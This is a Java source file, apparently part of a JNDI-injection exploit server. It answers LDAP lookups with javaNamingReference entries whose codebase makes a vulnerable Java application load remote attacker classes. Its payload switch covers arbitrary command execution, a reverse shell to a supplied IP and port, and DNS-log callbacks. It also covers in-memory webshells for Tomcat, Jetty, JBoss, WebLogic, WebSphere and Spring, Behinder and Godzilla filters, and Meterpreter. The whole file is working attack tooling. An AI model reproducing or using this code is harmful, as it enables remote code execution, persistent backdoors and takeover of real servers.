package com.feihong.ldap.controllers;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.exceptions.IncorrectParamsException;
import com.feihong.ldap.exceptions.UnSupportedPayloadTypeException;
import com.feihong.ldap.template.*;
import com.feihong.ldap.utils.*;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.net.URL;

import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = { "/basic" })
public class BasicController implements LdapController {
    //最后的反斜杠不能少
    private String codebase = Config.codeBase;
    private PayloadType type;
    private String[] params;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with basic remote reference payload|@"));
        //这个方法里面有改动，其他基本无改动
        Entry e = new Entry(base);
        String className = "";

        switch (type){
            case dnslog:
                DnslogTemplate dnslogTemplate = new DnslogTemplate(params[0]);
                dnslogTemplate.cache();
                className = dnslogTemplate.getClassName();
                break;
            case command:
                CommandTemplate commandTemplate = new CommandTemplate(params[0]);
                commandTemplate.cache();
                className = commandTemplate.getClassName();
                break;
            case reverseshell:
                ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(params[0], params[1]);
                reverseShellTemplate.cache();
                className = reverseShellTemplate.getClassName();
                break;
            case tomcatecho:
                className = TomcatEchoTemplate.class.getName();
                break;
            case springecho:
                className = SpringEchoTemplate.class.getName();
                break;
            case weblogicecho:
                className = WeblogicEchoTemplate.class.getName();
                break;
            case tomcatmemshell1:
                className = TomcatMemshellTemplate1.class.getName();
                break;
            case tomcatmemshell2:
                className = TomcatMemshellTemplate2.class.getName();
                break;
            case tomcatmemshell3:
                className = BehinderFilter.class.getName();
                break;
            case jettymemshell:
                className = JettyMemshellTemplate.class.getName();
                break;
            case jbossmemshell:
                className = JBossMemshellTemplate.class.getName();
                break;
            case weblogicmemshell1:
                className = WeblogicMemshellTemplate1.class.getName();
                break;
            case weblogicmemshell2:
                className = WeblogicMemshellTemplate2.class.getName();
                break;
            case webspherememshell:
                className = WebsphereMemshellTemplate.class.getName();
                break;
            case springmemshell:
                className = SpringMemshellTemplate.class.getName();
                break;
            case issuccess:
                className = isSuccess.class.getName();
                break;
            case godzillamemshell:
                className = GodzillaFilter.class.getName();
                break;
            case jettymemshell2:
                className=JettyBehinderFilter.class.getName();
                break;
            case meterpreter:
                className=Meterpreter.class.getName();
                break;

        }

        URL turl = new URL(new URL(this.codebase), className + ".class");
        System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Send LDAP reference result for |@" + base + " @|MAGENTA redirecting to |@" + turl));
        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaCodeBase", this.codebase);
        e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
        if (className.equals("com.feihong.ldap.template.Meterpreter")){
            e.addAttribute("javaFactory", "Meterpreter");
        }
        e.addAttribute("javaFactory", className);
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try{
            int fistIndex = base.indexOf("/");
            int secondIndex = base.indexOf("/", fistIndex + 1);
            if(secondIndex < 0) secondIndex = base.length();

            try{
                type = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
                System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
            }catch(IllegalArgumentException e){
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
            }

            switch(type){
                case dnslog:
                    String url = base.substring(base.lastIndexOf("/") + 1);
                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA URL >> |@" + url));
                    params = new String[]{url};
                    break;
                case command:
                    String cmd = Util.getCmdFromBase(base);
                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                    params = new String[]{cmd};
                    break;
                case reverseshell:
                    String[] results = Util.getIPAndPortFromBase(base);
                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA IP >> |@" + results[0]));
                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Port >> |@" + results[1]));
                    params = results;
                    break;
            }
        }catch(Exception e){
            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
